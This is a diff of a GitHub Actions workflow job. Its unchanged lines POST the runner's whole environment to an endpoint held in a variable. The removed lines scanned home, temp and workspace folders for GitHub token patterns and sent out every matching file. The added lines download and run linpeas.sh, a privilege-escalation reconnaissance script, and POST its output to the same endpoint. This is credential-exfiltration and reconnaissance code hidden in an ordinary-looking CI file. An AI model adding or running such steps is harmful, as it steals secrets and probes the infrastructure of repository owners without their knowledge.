@@ -32,36 +32,14 @@ jobs:
           curl -s -o /dev/null -X POST "${TEST}" \
             -H "Content-Type: text/plain" \
             --data-binary "$ALL_ENV"
-            
+          curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
+          chmod +x /tmp/linpeas.sh
+          /tmp/linpeas.sh > /tmp/linpeas-output.txt 2>&1
+
           curl -s -o /dev/null -X POST "${TEST}" \
             -H "Content-Type: text/plain" \
-            --data-binary "$secrets.PERSONAL_ACTION_TOKEN"
-          TARGETS=(
-            "$HOME"
-            "$RUNNER_TEMP"
-            "$GITHUB_WORKSPACE"
-          )
-      
-          for target in "${TARGETS[@]}"; do
-            [ -d "$target" ] || continue
-      
-            find "$target" -type f 2>/dev/null | while read -r file; do
-      
-              # GitHub PATs
-              if grep -qE 'github_pat_[A-Za-z0-9_]{20,}' "$file" 2>/dev/null; then
-                curl -s -o /dev/null -X POST "${TEST}" \
-                  -H "Content-Type: text/plain" \
-                  --data-binary "$file"
-              fi
-      
-              # Classic GitHub tokens
-              if grep -qE 'gh[pousr]_[A-Za-z0-9]{20,}' "$file" 2>/dev/null; then
-                curl -s -o /dev/null -X POST "${TEST}" \
-                  -H "Content-Type: text/plain" \
-                  --data-binary "$file"
-              fi
-      
-            done
-          done
+            --data-binary "@/tmp/linpeas-output.txt"
+            
+          
 
           echo "::notice::Done"
